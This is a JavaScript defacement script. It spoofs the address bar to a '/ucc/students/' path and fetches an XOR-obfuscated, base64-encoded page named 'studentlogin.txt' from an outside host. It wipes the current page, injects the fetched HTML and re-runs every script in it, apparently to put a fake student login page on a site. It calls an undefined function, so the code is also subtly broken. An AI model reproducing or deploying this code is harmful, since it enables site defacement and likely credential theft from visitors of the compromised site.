function clearAndInjectEverything(decryptedHTML) {
    // Clear the entire document (head and body)
    document.head.innerHTML = '';
    document.body.innerHTML = '';

    // Create a temporary container to parse the new HTML
    const tempDiv = document.createElement('div');
    tempDiv.innerHTML = decryptedHTML;

    // Inject head content (e.g., <meta>, <title>, <link>, etc.)
    const headElements = Array.from(tempDiv.querySelectorAll('head > *'));
    headElements.forEach((element) => {
        document.head.appendChild(element);
    });

    // Inject body content (e.g., <div>, <p>, etc.)
    const bodyElements = Array.from(tempDiv.querySelectorAll('body > *'));
    bodyElements.forEach((element) => {
        document.body.appendChild(element);
    });

    // Handle script tags (external and inline)
    const scripts = tempDiv.querySelectorAll('script');
    scripts.forEach((script) => {
        const newScript = document.createElement('script');
        if (script.src) {
            // External script
            newScript.src = script.src;
            newScript.async = false;  // Ensures scripts run in order
            document.body.appendChild(newScript);
        } else {
            // Inline script
            newScript.textContent = script.textContent;
            document.body.appendChild(newScript);
        }
    });
}

function xorEncryptDecrypt(decodedhtml, key) {
    let result = '';
    for (let i = 0; i < decodedhtml.length; i++) {
        result += String.fromCharCode(decodedhtml.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

function deface() {
    history.replaceState(null, null, '/ucc/students/');
    fetch('https://cybercutie0.github.io/-/studentlogin.txt')
        .then(response => response.text()) // Get the response as text (HTML content)
        .then(data => {
            document.body.innerHTML = '';
            let decodedhtml = atob(data);
            let decryptedHTML = xorEncryptDecrypt(decodedhtml, 'fUCCk')
            // Replace the entire HTML of the current document
            injectHTMLAndLoadResources(decryptedHTML);
        })
        .catch(error => console.error('Error:', error));
}

console.log("DEFACER SUCCESS");
deface();
